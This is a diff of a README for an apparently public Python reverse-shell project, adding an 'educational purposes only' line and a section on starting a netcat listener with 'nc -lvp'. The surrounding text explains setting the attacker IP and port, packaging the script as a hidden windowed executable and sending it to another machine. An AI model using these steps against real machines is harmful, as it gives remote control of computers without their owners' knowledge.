@@ -7,13 +7,13 @@
 <a href="#"><img alt="reverseshellpy License" src="https://img.shields.io/github/license/cdkw/reverseshellpy?color=orange&style=for-the-badge"></a>
 <a href="https://github.com/cdkw/reverseshellpy/issues"><img alt="reverseshellpy issues" src="https://img.shields.io/github/issues/cdkw/reverseshellpy?color=purple&style=for-the-badge"></a>
 
-<p align="center">Do not attack anyone without their consent.</p>
+<p align="center">Do not attack anyone without their consent. Made for educational purposes only.</p>
 <p align="center"><img src="https://i.imgur.com/uKFy6zZ.png" alt="SCRIPT"></p>
 
 
 # Usage:
 
-Replace in the python file the ip and port of your netcat reverse shell server.
+Replace in the python file the ip and port of your netcat reverse shell server. (tutorial on that below)
 ```py
 def main():
     server_ip = '127.0.0.1'  # Replace with the server's IP address
@@ -32,6 +32,10 @@ Select the `Script Location`, then choose `One file`, then choose `window based`
 Now, just send it to your other machine. 
 `Note that this is not obfuscated or made to be used with any tunnel to hide the server's ip.`
 
+# Netcat Server
+
+Open a terminal in a machine that has installed netcat (ncat, nc), for example u can get it while installing nmap for windows. 
+In the terminal, type `nc -lvp <PORT>`, replacing `<PORT>` with the port you have chosen for your listener.
 
 # Post-exploitation:
 
